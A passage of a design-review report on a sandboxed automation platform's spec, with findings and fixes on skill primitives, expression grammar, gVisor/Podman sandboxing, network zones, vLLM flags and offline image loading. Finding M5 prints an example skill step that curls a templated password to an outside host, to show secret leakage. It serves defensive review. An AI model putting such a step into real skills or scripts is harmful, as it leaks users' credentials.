Fix: CLAUDE.md §6.3 lines 529 and 543: move `id` to step level, e.g. '- { id: status, ssh: { target: "{{ station }}", command: ["burnin-ctl","status","--json"] } }' and '- { id: sel, redfish: { target: "{{ target }}", action: get_sel } }'. CLAUDE.md §6.1 after line 479: add 'Templates: `{{ <input> }}` and `{{ steps.<id>.<output> }}`, resolved by code at compile/run time. `when` and `assert.condition` use a fixed grammar — comparison operators (==, !=, <, <=, >, >=), and/or/not, string and number literals, template references — evaluated by code, never by a model.' CLAUDE.md §6.2: add an 'Outputs' column (run/ssh → stdout, stderr, exit_code; redfish get_sel → file, count; get_power_state → state; get_inventory → file; screenshot → file; sel_snapshot/inventory_snapshot → file). docs/ui-demo/slas-ui-demo.html line 298: align step count with §6.3 once #9 is settled.

Invariants: INV-12

Traceability: lenses cross-document, internal-consistency, spec-ambiguity; ids cross-document#8, spec-ambiguity#28, spec-ambiguity#7, internal-consistency#22

### M2. INV-7 lists 'station config change' as destructive, but skill risk is per primitive and every screen primitive is 'safe'
Where: `CLAUDE.md:101`, `CLAUDE.md:485-488`, `CLAUDE.md:387`, `CLAUDE.md:396`, `CLAUDE.md:641`, `CLAUDE.md:494`, `CLAUDE.md:662`
Also raised as: INV-7 'station config change' has no detection mechanism for an arbitrary ssh/run step on a station

What the documents say: Skill risk is classified per primitive; every screen primitive is 'safe' and `run`/`ssh` only 'caution', so a skill that changes station configuration through the GUI or a command imports and runs with no INV-7 approval, and the same holds for BIOS settings changed through 'BIOS setup over KVM'.

Why it matters: The importer's risk classifier is the only automatic INV-7 check for skills; as designed it can flag only `redfish` power actions, so the approval requirement for station config change has no mechanism behind it.

Fix: Add to §6.1 a skill-level `effects: [none | station_config | bios_settings | power]` field, required when `requires` includes screen or ssh on factory/validation; import classifies `station_config`/`bios_settings` as destructive regardless of primitives ('risk is the maximum of primitive risk and declared effects'); the station deny-list blocks configuration windows unless the skill declares the effect and the run was approved. Add P4 done-when: 'a screen-only skill declaring effects: station_config shows the approval requirement at import and at run'.

Owner decision: yes

Invariants: INV-12, INV-7

Traceability: lenses fresh-shop-floor, invariant-enforcement; ids fresh-floor#26, invariant-enforcement#29

### M3. Two primitive whitelists (skill §6.2 vs plans/primitives) with undefined relationship; guardrail names like `ac_cycle` match neither
Where: `CLAUDE.md:279`, `CLAUDE.md:504-505`, `CLAUDE.md:781`, `CLAUDE.md:648-649`, `CLAUDE.md:496`, `docs/PROMPTS.md:152-153`, `CLAUDE.md:634-635`, `docs/DEVELOPMENT_PLAN.md:115-116`
Also raised as: No whitelist of Validation/Factory plan primitives exists anywhere; P7 must invent it

What the documents say: The document names 'the primitive whitelist' as if singular, then reveals a second, richer plan-primitive set that is nowhere enumerated; guardrails reference `ac_cycle`, which is neither a §6.2 redfish action nor a documented plan primitive.

Why it matters: The executor's dispatch table, the plan schema and the INV-7 approval gate all key on primitive names; without the list, P7 implementers will invent verbs and the guardrail file cannot be validated.

Fix: Add CLAUDE.md §6.4 'Plan primitives (Validation/Factory, `plans/primitives/`)': a table that is a superset of §6.2 plus `dc_cycle`, `ac_cycle` (PDU), `warm_boot`, `firmware_flash`, `secure_erase`, `bios_reset`, `raid_reconfigure`, `stress {tool, args}`, `collect {logs}`, each with Needs and Risk columns as in §6.2; add 'names in `config/guardrails.yaml requires_approval` MUST be drawn from this table'. Change the comment at line 279 to 'returns steps from §6.2 (skills) or §6.4 (plans)'.

Owner decision: A) enumerate the plan verbs now in §6.4 — recommended, since INV-7 gating keys on them. B) defer to P7 but add a placeholder §6.4 that at least lists the five guardrail names as plan primitives.

Invariants: INV-3, INV-7

Traceability: lenses fresh-prompts-adr-gitignore, internal-consistency; ids internal-consistency#16, fresh-prompts#40

### M4. `run` primitive has no argument selecting sandbox vs target, yet is defined to execute in either
Where: `CLAUDE.md:493`, `CLAUDE.md:309-311`, `CLAUDE.md:494`

What the documents say: `run` and `ssh` overlap (both execute argv on a machine) and `run` has no `target`/`on` argument, so a Validation or Factory skill using `run` has no defined executor and no defined capability (`files` vs `ssh`).

Why it matters: The executor must know where a command runs to apply the right capability check (INV-12) and to guarantee it never runs on the platform host (INV-4).

Fix: In CLAUDE.md §6.2 line 493: set Needs to 'files' and add 'executes only in the job's sandbox (Coding); on Validation/Factory the compiler rejects `run` — use `ssh` with an explicit target'. In §5.2 lines 309-311: 'inside the sandbox via `run`, or on the target via `ssh`'.

Owner decision: A) `run` = sandbox only; `ssh` = target — recommended (no ambiguity, one capability each). B) add `on: sandbox | {{ target_ref }}` to `run` and derive the capability from it; then `ssh` becomes redundant.

Invariants: INV-12, INV-4

Traceability: lenses internal-consistency; ids internal-consistency#23

### M5. Secret-typed skill inputs may be interpolated into any argument (run/ssh argv, copy paths, screenshot names, assert messages)
Where: `CLAUDE.md:471`, `CLAUDE.md:388`, `CLAUDE.md:493`, `CLAUDE.md:667-668`

What the documents say: Nothing restricts where `{{ password }}` may appear. `run: { command: ["curl", "http://x/{{ password }}"] }` puts the secret in argv (visible in `ps`, the journal and captured stdout); `screenshot: { name: "{{ password }}" }` puts it in a filename; `assert.message` puts it in the UI.

Why it matters: INV-5 and §11's argv rule are unenforceable at import time without a taint rule; a malicious imported skill exfiltrates the importing user's secrets into logs that models read.

Fix: In CLAUDE.md §6.1 add: 'A `secret` input may be referenced only by `type.text` and by a new `env: {NAME: "{{ secret }}"}` argument on `run`/`ssh` (the executor injects it as environment, never argv). Any other reference is a schema-validation error at import.' Update the `run`/`ssh` rows in §6.2 with the `env` arg and generate the constraint into `skill.schema.json`.

Invariants: INV-12, INV-5

Traceability: lenses security-threat-model; ids security-threat-model#16

### M6. Skill expression language (`when`, `condition`) and `{{ }}` templating engine are unspecified
Where: `CLAUDE.md:479`, `CLAUDE.md:500-501`, `CLAUDE.md:545`, `CLAUDE.md:503`, `docs/PROMPTS.md:92-93`, `CLAUDE.md:388`, `CLAUDE.md:106`, `docs/DEVELOPMENT_PLAN.md:67-68`
Also raised as: Skill `when: <expr>` and `condition` have no grammar, inviting a template engine that turns skills into programs; `when` expressions, `assert.condition` and `{{ }}` templating have no defined grammar; a Jinja2/eval implementation would make skills an SSTI surface

What the documents say: Three expression surfaces have no grammar; the example mixes templating and comparison in one string; no document names an engine, and the obvious choice (Jinja2 or eval) executes code from a data file.

Why it matters: Determines the P4 parser, what skill authors may write, and whether a hostile skill can run code in the executor (INV-12).

Fix: Add to §6.1 'Expression language': `{{ path }}` is pure substitution of a dotted path rooted at `inputs.` or `steps.<id>.` (no filters, no calls); `when`/`condition` accept `<operand> (==|!=|<|<=|>|>=) <operand>` joined by `and`/`or`/`not`, operands being paths, quoted strings, ints, bools; parsed by a hand-written parser in slas_skills.expr; Jinja2, eval and ast on user text are forbidden. Rewrite the example to `condition: "steps.sel.count < 4000"`.

Invariants: INV-12, INV-3

Traceability: lenses invariant-enforcement, security-threat-model, spec-ambiguity; ids spec-ambiguity#6, invariant-enforcement#22, security-threat-model#17


### 3.5 Runtime feasibility (sandbox, screen, inference, networks)

### M1. Quickstart makes gVisor optional ('if present') while §4.1 lists gVisor as the Zone A runtime and §12 defaults to runsc; the plan and PROMPTS add a 'hardened runc fallback' the SSOT never mentions, and no document says whether the bundle ships runsc
Where: `CLAUDE.md:121`, `CLAUDE.md:145`, `CLAUDE.md:739`, `CLAUDE.md:612`, `docs/DEVELOPMENT_PLAN.md:89`, `docs/PROMPTS.md:116-117`, `docs/ui-demo/slas-ui-demo.html:1067`
Also raised as: gVisor is 'if present' in quickstart but compose hard-codes DEFAULT_RUNTIME runsc; the fallback is named only in the companion docs

What the documents say: CLAUDE.md §3 says gVisor is used 'if present' in quickstart but never says what happens when it is absent; §4.1, §10.1 and §12 assume runsc unconditionally. The plan (line 89) and PROMPTS (line 116-117) decide a 'hardened runc fallback' — a weaker isolation for model-authored code — that the SSOT does not record, does not define ('hardened' how?), and does not surface to the user or `slas doctor`. Whether the bundle ships the runsc binary (so 'if present' is always true on a supported kernel) is stated nowhere.

Why it matters: A silent fallback to runc puts model-authored code one namespace away from the platform host, weakening the boundary INV-4 relies on; a hard failure breaks INV-10 unless the bundle ships runsc. The choice changes install.sh, doctor, the wizard copy and sandbox-manager.

Fix: CLAUDE.md §3 row 'Sandbox' quickstart cell (line 121): replace 'rootless Podman + gVisor if present' with 'rootless Podman + gVisor (runsc ships in the bundle and is installed by install.sh); if the host kernel cannot run runsc, `slas doctor` says so in a sentence and sandboxes fall back to hardened runc (read-only rootfs, no network, cap_drop ALL, seccomp default, PIDS limit) with the label "reduced isolation" shown on the wizard and the ticket'. CLAUDE.md §4.1 line 145 Runtime cell: 'gVisor (runc fallback labelled), Kata tier'. Record the decision in §15 and reference it from docs/DEVELOPMENT_PLAN.md line 89.

Owner decision: A (recommended default): ship runsc in the bundle, keep the plan's hardened-runc fallback but make it visible (doctor sentence, wizard/ticket label). B: no fallback — doctor fails preflight when runsc cannot run and the Coding agent is disabled until fixed; strongest, but INV-10 then depends on kernel support. C: silent runc fallback as the plan implies today — not recommended.

Invariants: INV-10, INV-4, INV-8

Traceability: lenses cross-document, internal-consistency; ids cross-document#17, internal-consistency#41

### M2. Quickstart provisions coder + embed + triage only, but the plan's done-when and milestones demand 3 voters, and planner / rerank roles have no stated alias
Where: `CLAUDE.md:123`, `CLAUDE.md:316-317`, `CLAUDE.md:367`, `CLAUDE.md:553-554`, `CLAUDE.md:329-330`, `CLAUDE.md:805-806`, `docs/DEVELOPMENT_PLAN.md:62-63`, `docs/DEVELOPMENT_PLAN.md:105`, `docs/DEVELOPMENT_PLAN.md:169`, `docs/DEVELOPMENT_PLAN.md:183`, `docs/ui-demo/slas-ui-demo.html:295`, `CLAUDE.md:107`, `CLAUDE.md:732-733`, `CLAUDE.md:728`, `docs/ui-demo/slas-ui-demo.html:973`, `CLAUDE.md:322`, `docs/ui-demo/slas-ui-demo.html:290-291`, `CLAUDE.md:573-574`, `docs/DEVELOPMENT_PLAN.md:79`, `CLAUDE.md:316-318`, `CLAUDE.md:322-325`, `docs/ui-demo/slas-ui-demo.html:288-295`, `docs/ui-demo/slas-ui-demo.html:318`, `docs/ui-demo/slas-ui-demo.html:942`
Also raised as: Default model inventory shipped in the bundle is undefined and the quickstart row conflicts with the roles the framework needs; Quickstart runs 3 inference instances (coder, embed, triage) but the design needs planner (zh translation), rerank and 3 distinct-family voters; Quickstart ships two generate instances but every cross-check assumes 3 voters, and the demo says fewer than 3 is an error; Quickstart ships two generate models but every consensus rule and the gateway default need three voters

What the documents say: CLAUDE.md §3 fixes the default profile at two generate instances (coder, triage) and no planner or rerank instance. §5.5 makes the zh-Hant rendering depend on `planner`; §8.3 pipelines a reranker; §5.3 wants three voters of different families. Only the voter shortfall has a documented behaviour (degrade to single model + flag, line 329-330, plan line 183). Nothing says how `planner` and `rerank` resolve when no instance exists, and the plan's P3 done-when (line 62-63), P6 done-when (line 105) and milestone M2 (line 169) require a 3-voter result that the default profile cannot produce. The UI demo silently aliases planner to the coder model and sets rerank to null — a decision the SSOT never records.

Why it matters: The gateway's role-resolution behaviour (fail vs alias), the Models page copy, and whether the M2/M4 demos are achievable on a quickstart host all depend on this; an implementer following §3 literally cannot meet the P3 and P6 done-when.

Fix: CLAUDE.md §3 row 'Inference', quickstart cell (line 123): append 'Roles not backed by an instance alias in Models/models.yaml: planner → coder, rerank → none (RRF only), voters → [coder, triage]; the Consensus Router then runs in its documented degraded mode and every verdict is labelled "2 of 3 voters — reduced cross-check" until a third generate instance is added.' CLAUDE.md §7 (after line 554): add 'models.yaml must resolve every role; a role may alias another instance; the Models page and `slas doctor` list aliased roles in a sentence. A missing role is a startup error, never a silent skip.' docs/DEVELOPMENT_PLAN.md line 62-63 and 105: qualify as '3 voters when three generate instances are configured (CI uses the fake vLLM); on the default profile the verdict shows the reduced-cross-check label'. Close CLAUDE.md §15 open decision (2) with the alias rule.

Owner decision: A (recommended default): keep the 3-instance quickstart profile and document the alias table + reduced-cross-check label above; matches the UI demo. B: make quickstart provision three generate instances (coder, a second-family voter that also serves planner, triage) and update §3, §12 comments and the fit sentence; needs the GPU budget from open decision (2).

Invariants: INV-1, INV-10, INV-11, INV-13

Traceability: lenses cross-document, fresh-supply-chain, internal-consistency, invariant-enforcement, technical-feasibility, ui-and-ux; ids cross-document#2, fresh-bundle#6, internal-consistency#28, invariant-enforcement#5, technical-feasibility#5, technical-feasibility#6, ui-demo-vs-spec#2

### M3. Zone S network is 'none' in §4.1 but screen-worker joins slas-screen and slas-frontend in §12; its gVisor runtime is never declared
Where: `CLAUDE.md:150`, `CLAUDE.md:708`, `CLAUDE.md:723`, `CLAUDE.md:722-725`, `CLAUDE.md:299-300`, `CLAUDE.md:146-147`, `CLAUDE.md:144`, `CLAUDE.md:715`, `CLAUDE.md:751`
Also raised as: Zone S network is 'none' in §4.1 but the screen-worker joins slas-frontend in §12 for the operator's noVNC; Zone S network is 'none' in §4.1 but screen-worker joins slas-screen and slas-frontend in §12; Zone table network cells say 'lab VLAN only' / 'factory LAN only' / 'backend' while compose puts those services on backend + observability (+ frontend)

What the documents say: The zone table says Zone S has no network and runs under gVisor; the compose blueprint puts it on two networks (one reachable from the frontend) and sets no `runtime: runsc`, while sandboxes get `DEFAULT_RUNTIME: runsc` explicitly.

Why it matters: An implementer must choose between an unreachable screen worker (no operator VNC) and a frontend-exposed one, and must guess whether Xvfb + noVNC runs under gVisor, which constrains shm and X socket behaviour.

Fix: In CLAUDE.md §4.1 line 150, Network cell: replace 'none (talks to orchestrator only)' with 'slas-screen (orchestrator) + slas-frontend (operator noVNC via edge); no egress'. In §12 lines 722-725: add `runtime: runsc` with the comment '# prod: Kata per session (§3 line 122)'. If gVisor is not intended for the screen worker, change §4.1 Runtime to 'plain container, cap_drop ALL' and §3 line 122 accordingly.

Owner decision: A) screen-worker runs under gVisor (`runtime: runsc`), matching §4.1 and the fact that it executes skill-authored GUI steps — recommended. B) plain hardened container; then §4.1 line 150 and §3 line 122 must be changed. Either way the Network cell must list slas-screen + slas-frontend.

Invariants: INV-4

Traceability: lenses cross-document, internal-consistency, invariant-enforcement; ids internal-consistency#4, cross-document#15, invariant-enforcement#11, internal-consistency#47

### M4. Validation 'BIOS setup over KVM' GUI steps need lab-VLAN reach, but the screen driver runs in Zone S, which has no lab network
Where: `CLAUDE.md:641`, `CLAUDE.md:188`, `CLAUDE.md:150`, `CLAUDE.md:146`, `CLAUDE.md:709`

What the documents say: A BMC HTML5/Java KVM viewer must run on the Xvfb display and open a connection to the BMC. Only validation-executor is on slas-lab, so the documented Validation GUI use case cannot be implemented as drawn.

Why it matters: Either Zone S needs lab membership (widening the blast radius of skill-authored GUI steps to the lab) or a KVM relay in Zone B is needed; both change the network design and Zone B's 'sole lab member' statement.

Fix: Add to CLAUDE.md §5.2 'Screen driver rules' (after line 308): 'Validation GUI sessions reach the BMC KVM through a per-run, authenticated TCP relay that validation-executor exposes on slas-screen; screen-worker never joins slas-lab.' In §12 line 751: add `slas-screen` to validation-executor's networks; in §4.1 line 146: 'lab VLAN (sole member) + slas-screen (KVM relay) + backend'. Record as an ADR (boundary change).

Owner decision: A) per-run KVM relay in validation-executor on slas-screen (recommended; keeps Zone S out of the lab). B) screen-worker joins slas-lab (needs ADR; skill-authored steps gain lab reach). C) drop KVM/BIOS GUI from Validation scope and use Redfish BIOS attributes only; then delete 'BIOS setup over KVM' at line 641 and 'BIOS' at line 188.

Invariants: INV-4

Traceability: lenses internal-consistency; ids internal-consistency#5

### M5. Coding 'virtual desktop via Zone S' has no defined display transport between a network-less sandbox and the screen worker
Where: `CLAUDE.md:612`, `CLAUDE.md:145`, `CLAUDE.md:186-188`, `CLAUDE.md:739`, `CLAUDE.md:153-154`, `CLAUDE.md:150`, `CLAUDE.md:68`, `CLAUDE.md:188`, `CLAUDE.md:599`, `docs/DEVELOPMENT_PLAN.md:89-101`
Also raised as: No path for a GUI program in the Zone A sandbox to render on the Zone S Xvfb display; Coding's optional virtual desktop (Zone S for an IDE) is promised in §1.1, §4.2, §9 and §10.1 but designed and scheduled nowhere; Zone A and Zone S share no network

What the documents say: An IDE or GUI app runs as a process in the sandbox but must display on the Xvfb in screen-worker. With sandbox network `none`, Zone S network `none`/slas-screen, and no shared X socket volume in §12, there is no X transport, and the docs never say whether the GUI app runs in Zone A or Zone S.

Why it matters: The implementer must invent either a per-session X socket volume shared between two gVisor containers or run the IDE inside screen-worker (moving model-authored code into Zone S) — a boundary decision that needs an ADR.

Fix: In CLAUDE.md §5.2 add a rule after line 308: 'For Coding desktop sessions, screen-worker publishes the session's X socket on a per-session tmpfs volume that sandbox-manager mounts read-write into that one sandbox (DISPLAY=:N); no host X socket is involved (INV-4).' Add the volume to §12 `screen-worker` (722-725) and `sandbox-manager` (738-741), and add 'sandbox ↔ screen-worker (X socket volume)' to the §4.1 Zone A and Zone S Network cells (145, 150).

Owner decision: A) per-session X socket on a shared tmpfs volume between screen-worker and that sandbox only — recommended. B) run the IDE process inside screen-worker (Zone S then executes model-authored code; needs ADR and Zone S hardening equal to Zone A). C) Coding desktops are Zone-S-only viewers and the sandbox stays CLI; then reword line 68 '(CLI or virtual desktop)' and line 612.

Invariants: INV-4

Traceability: lenses fresh-cross-document-and-plan, internal-consistency, technical-feasibility; ids internal-consistency#6, technical-feasibility#14, fresh-plan#38

### M6. P1 scope has Admin → Settings write .env, which compose loads once per container; P1 done-when, INV-9, §9 and the demo all require no restart
Where: `docs/DEVELOPMENT_PLAN.md:41-42`, `docs/DEVELOPMENT_PLAN.md:43-44`, `CLAUDE.md:703`, `CLAUDE.md:103`, `CLAUDE.md:584-585`, `docs/PROMPTS.md:60-61`, `docs/ui-demo/slas-ui-demo.html:1069`

What the documents say: The input marked this location UNVERIFIED; it is verified: DEVELOPMENT_PLAN.md:41-42 says Settings 'writes `.env`'. Every service consumes .env through compose env_file, which is read only when a container is created, so a value written to .env changes nothing until containers are recreated. The same phase's done-when demands 'change a setting without a restart', and no document names any other settings store.

Why it matters: P1 scope and P1 done-when cannot both be satisfied with env_file semantics; the implementer must invent the settings store (Postgres table with hot reload, or file-watching .env). That choice is a data-model decision (ADR per §15) that shapes the API, the Admin page, install.sh and every service's config loading, and it must exist before P1 code is written.

Fix: DEVELOPMENT_PLAN.md P1 scope: replace '(writes `.env`)' with '(a `settings` table in Postgres, re-read by services on change; `.env` holds bootstrap values only — data root, database/Redis URLs, SLAS_SECRET_KEY, profile — and is never written by the UI or CLI)'. P1 done-when: add 'changing the minimum-voter setting is visible to the api within 5 s with no container restarted (asserted by container start-time)'. CLAUDE.md §3 after line 129: add the same bootstrap-only sentence for .env. Record the data model in an ADR (P1).

Invariants: INV-9

Traceability: lenses plan-sequencing-and-coverage; ids plan-sequencing-and-coverage#4

### M7. sandbox-manager's exec API is an undefined privilege boundary in front of the Podman socket on the shared backend network
Where: `CLAUDE.md:740`, `CLAUDE.md:440`, `CLAUDE.md:98`, `docs/PROMPTS.md:270-271`

What the documents say: Whoever can talk to sandbox-manager controls a Podman socket. Its API is reachable from every backend service yet has no stated caller authentication, request schema, or binding of an exec to the owning session. If it accepts image, mount or network parameters from callers, a compromised orchestrator creates a container with a host mount.

Why it matters: A backend compromise escalates to the platform host — the outcome INV-4 exists to prevent — through a component the invariant deliberately exempts.

Fix: In CLAUDE.md §11 'Separation' add a sandbox-manager contract: 'Callers (orchestrator, api) authenticate with per-service mTLS; requests are `{session_id, argv[], cwd, timeout_s, user_token}`; sandbox-manager owns the session→container map and the complete container spec (image digest, runtime, mounts, network) from its own config and accepts none of them from callers; the user token must own the session and hold the relevant capability (`git:terminal`, `coding:run`); every exec is written to the ticket journal.' State the same for model-manager.

Invariants: INV-4

Traceability: lenses security-threat-model; ids security-threat-model#26

### M8. focus_window and the focus-change hard stop need an EWMH window manager that the screen-worker image omits
Where: `CLAUDE.md:299-300`, `CLAUDE.md:722`, `CLAUDE.md:485`, `CLAUDE.md:307-308`, `CLAUDE.md:188`

What the documents say: xdotool windowactivate/getactivewindow rely on _NET_ACTIVE_WINDOW from a window manager; bare Xvfb has none, so activation, raise/stacking, dialog placement and any 'virtual desktop' for an IDE are undefined. A minimal WM is a new dependency absent from §4.3 and the §12 image comment.

Why it matters: P4's screen driver cannot implement focus_window semantics or the focus-change stop as specified, and the Coding agent's 'virtual desktop' is not a desktop without a WM.

Fix: In §4.3 'Screen' and the §12 screen-worker comment add a pinned minimal EWMH WM (e.g. openbox or fluxbox, no panel) started per display before x11vnc; in §5.2 state 'focus_window = xdotool search --name/--class + windowactivate --sync; _NET_ACTIVE_WINDOW polled at 10 Hz for the hard stop'. Record the dependency in an ADR.

Owner decision: openbox vs fluxbox vs a bare XSetInputFocus/raise implementation without WM (works for single-window vendor tools only, not for an IDE/desktop).

Traceability: lenses technical-feasibility; ids technical-feasibility#11

### M9. 'accessible name', `text` and `image` targeting need AT-SPI, OCR and OpenCV; `target:` grammar is undefined
Where: `CLAUDE.md:305-306`, `CLAUDE.md:486`, `CLAUDE.md:522`, `CLAUDE.md:528`, `CLAUDE.md:217`, `CLAUDE.md:305`, `CLAUDE.md:217-218`
Also raised as: `click: { target: "#username" }` uses an undefined `target` selector form that sits oddly with the find-by-title/name/image rule; `click: { target: "#username" }` uses an undefined selector language

What the documents say: PyAutoGUI + xdotool can click coordinates, type, press keys and match a template image exactly (tolerance requires OpenCV); locating by accessible name needs AT-SPI2 (at-spi2-core, session D-Bus, pyatspi, accessibility-enabled apps); locating by visible text needs OCR (Tesseract with eng + chi_tra data bundled per INV-1). `target: "#username"` is a CSS-like selector no listed technology resolves and §6.2 never defines `target`.

Why it matters: The primitive whitelist is the contract between skills, the compiler, screen-worker and the station runner; its selector semantics decide dependencies and test fakes for P4 and P9.

Fix: In §6.2 define `target` as a structured selector `{role?, name?, window?}` resolved via the accessibility tree, `text` as OCR-or-accessibility match with a `lang` default from Settings, and `image` as a template under the skill's assets with `confidence` (default 0.9). In §4.3 add 'at-spi2-core + pyatspi, tesseract-ocr with eng+chi_tra data bundled, opencv-python-headless, all pinned'. Replace `target: "#username"` in §6.3 with `target: { role: entry, name: "Username" }`. One ADR for the three dependencies.

Owner decision: Full stack (AT-SPI + OCR + OpenCV) vs narrowing §5.2 to window title + template image only and dropping `text`/accessible-name targeting.

Invariants: INV-1

Traceability: lenses internal-consistency, spec-ambiguity, technical-feasibility; ids technical-feasibility#12, internal-consistency#46, spec-ambiguity#29

### M10. 'rootless Podman' sandboxes vs `docker compose up` vs mounting the rootful /run/podman/podman.sock
Where: `CLAUDE.md:121`, `CLAUDE.md:127-128`, `CLAUDE.md:731`, `CLAUDE.md:740`, `CLAUDE.md:217`, `docs/DEVELOPMENT_PLAN.md:89`, `CLAUDE.md:128`, `CLAUDE.md:120`, `docs/PROMPTS.md:116-117`, `CLAUDE.md:216-217`
Also raised as: Container engine for the platform is undecided: docker compose and Docker secrets versus Podman socket mounts; Container engine undecided: `docker compose up -d` with 'rootless Podman', yet the rootful `/run/podman/podman.sock` is mounted; §3/§4.3 say rootless Podman but §12 mounts the rootful socket path `/run/podman/podman.sock`

What the documents say: /run/podman/podman.sock is the rootful system socket; a rootless user's API socket is $XDG_RUNTIME_DIR/podman/podman.sock and only exists for a lingering user with podman.socket enabled. §3/§4.3/P6 say 'rootless', §12 mounts the rootful path into sandbox-manager and model-manager, and install.sh drives everything with `docker compose`.

Why it matters: sandbox-manager, model-manager, install.sh preflight and the compose files are all written differently depending on which engine/socket is chosen; an implementer must guess.

Fix: Decide and record in §3 'Sandbox' row, §4.3 and §12: EITHER (A) rootful Podman (docker-compat socket, DOCKER_HOST=unix:///run/podman/podman.sock) for platform and sandboxes, isolation from gVisor + --userns=auto + cap_drop ALL + network none, and drop the word 'rootless'; OR (B) rootful platform plus a dedicated `slas-sandbox` system user whose linger + podman.socket install.sh enables, mounting /run/user/<uid>/podman/podman.sock into sandbox-manager. Change both socket mounts in §12 accordingly and add the check to `slas doctor`.

Owner decision: A: single rootful engine (simplest, Kata-compatible). B: rootless sandbox user (defence in depth, no Kata, install.sh must set up linger).

Invariants: INV-10, INV-4, INV-8

Traceability: lenses fresh-supply-chain, internal-consistency, security-threat-model, technical-feasibility; ids technical-feasibility#2, fresh-bundle#2, internal-consistency#8, security-threat-model#27

### M11. Rootless gVisor resource limits and a rootless Kata/Firecracker tier
Where: `CLAUDE.md:121`, `CLAUDE.md:217`, `CLAUDE.md:739`, `CLAUDE.md:145`

What the documents say: Kata Containers has no supported rootless mode (needs /dev/kvm and a rootful shim), so '§4.3 rootless Podman, gVisor, Kata' pairs incompatible pieces; in rootless runsc the kernel cgroup (pids/memory) enforcement is version-dependent and often runs with --ignore-cgroups, so PIDS_LIMIT may be unenforced; the 'allowlist proxy' network variant needs a netns rootless runsc cannot create.

Why it matters: Model-authored code with an unenforced pid/memory limit can exhaust the host; the prod Kata tier cannot be delivered on the rootless story, so sandbox-manager and `slas doctor` must be designed for a different mechanism.

Fix: Same decision as #2. If rootful is chosen: in §3/§4.1 write 'rootful Podman + gVisor (runsc) with --userns=auto; pids/memory/cpu enforced by cgroup v2; network none; prod adds Kata (requires /dev/kvm, checked by slas doctor)'. If rootless is kept: remove Kata/Firecracker from the rootless path in §4.3, pin the gVisor release and state whether its rootless mode honours cgroup v2, and add a sandbox-manager watchdog rule for limits.

Owner decision: See #2. Additionally: pin the gVisor release; Kata only in prod on rootful hosts.

Invariants: INV-4

Traceability: lenses technical-feasibility; ids technical-feasibility#3

### M12. Mandatory vLLM flags are version-specific and no vLLM version is pinned
Where: `CLAUDE.md:559-560`, `CLAUDE.md:680`, `CLAUDE.md:216`, `docs/PROMPTS.md:81`

What the documents say: In vLLM ≥ 0.10 (V1 engine) prefix caching is default-on and `--guided-decoding-backend` is deprecated in favour of `--structured-outputs-config`, later removed; the request field `guided_json` is deprecated for `structured_outputs`/`response_format`. No vLLM version or image digest is named anywhere, so the mandatory flags cannot be checked.

Why it matters: model-manager launches every generate container with these flags; on a current vLLM the container exits at startup, failing P3 health checks, and the gateway's tier-0 request field depends on the same version.

Fix: In §7 replace the sentence with 'Every generate instance runs with structured outputs enabled (xgrammar preferred, automatic fallback) and prefix caching; the exact CLI flags and request field for the pinned vLLM version live in `packages/slas-schemas/vllm_flags.py` and are asserted by a unit test'. Add the pinned vLLM version and image digest to §4.3 and §12. In §11 tier 0 say 'the structured-output request field of the pinned version'.

Owner decision: Which vLLM release to pin (decides flag names, xgrammar-only vs auto backend).

Invariants: INV-8

Traceability: lenses technical-feasibility; ids technical-feasibility#7

### M13. Blue/green swap needs headroom for two instances; §3, §7 and the demo disagree on when it applies
Where: `CLAUDE.md:554-557`, `CLAUDE.md:123`, `docs/ui-demo/slas-ui-demo.html:934`

What the documents say: vLLM pre-allocates --gpu-memory-utilization (default 0.9) of each GPU at start, so a second instance of the same role on the same GPU aborts with OOM; blue/green needs a spare GPU or halved utilisation. §3 lists blue/green under prod only, §7 makes it the general mechanism, and the demo already models a stop-start fallback with downtime.

Why it matters: model-manager's swap state machine and `slas model fit` differ between true blue/green and fit-dependent stop-start; INV-9's 'no restarts' promise cannot be kept on a single-GPU install without saying so.

Fix: In §7 write: 'Swap: `slas model fit` computes weights + KV need per GPU; if headroom exists the swap is blue/green (candidate alongside, smoke test, route switch, drain); otherwise stop-start with a stated downtime sentence, as in the demo. 24 h rollback means the previous weights and models.yaml entry stay on disk and restart in one click, not that the incumbent stays resident.' Keep §3 'blue/green' for prod and add 'fit-dependent' for quickstart.

Invariants: INV-9

Traceability: lenses technical-feasibility; ids technical-feasibility#8


### 3.6 Offline bundle, install and upgrade

### M1. Digest-pinned image references cannot resolve after an offline image load
Where: `CLAUDE.md:713`, `CLAUDE.md:127-128`, `CLAUDE.md:699`, `CLAUDE.md:102`, `docs/DEVELOPMENT_PLAN.md:42`, `CLAUDE.md:713-714`
Also raised as: `image: name@sha256:…` references are not resolvable after an offline `docker load`

What the documents say: §12 pins every service by registry manifest digest (`registry.internal/<repo>@sha256:…`) while §3 obtains images with an offline load. On Docker's classic (graphdriver) image store `docker load` does not restore RepoDigests, so `compose up` tries to pull `registry.internal/...@sha256:...` and fails on a host with no registry and no DNS for it. No document reconciles the two: no bundled registry in quickstart (Harbor is P12/prod only), no verification step, and no alternative pinning form.

Why it matters: If compose/ follows §12 literally, P1's INV-10 test fails on the most common engine configuration; the implementer must invent both the pinning form and the load/verify step, and different sessions will choose differently. INV-8 is not weakened by the fix, but the docs currently point at a form that cannot be honoured offline.

Fix: Decide in the same ADR as fresh-bundle#2 and record in §3 and §12. Recommended (A): compose references `registry.internal/slas/<svc>:<version>` (immutable release tag, never `latest`) plus `bundle/images.lock` {name, tag, image_id (config sha256), manifest_digest, size}; install.sh loads each `images/<name>.tar`, checks `image inspect --format {{.Id}}` equals the lock's image_id, tags it, aborts otherwise with a three-part message. Change §12's `@sha256:…` to `:<version>` with a comment 'verified against images.lock at load'. Add to P1 done-when: 'compose up succeeds on a host with no DNS entry for registry.internal and image pulls blocked'.

Owner decision: A: immutable version tag + verified image_id lock (no new container) — recommended default. B: ship an OCI layout and start a bundled registry container preloaded by install.sh so @sha256 references resolve (new container, ADR; also gives prod's Harbor a quickstart analogue). C: Podman-only platform loading OCI archives, which preserve the manifest digest (settles fresh-bundle#2 at the same time).

Invariants: INV-1, INV-10, INV-8

Traceability: lenses fresh-supply-chain, technical-feasibility; ids fresh-bundle#1, technical-feasibility#4

### M2. NVQual and MFT are baked into the validation-executor image although vendor EULAs generally forbid redistribution
Where: `CLAUDE.md:750`, `CLAUDE.md:146`, `CLAUDE.md:98`, `CLAUDE.md:784`, `docs/DEVELOPMENT_PLAN.md:128-129`

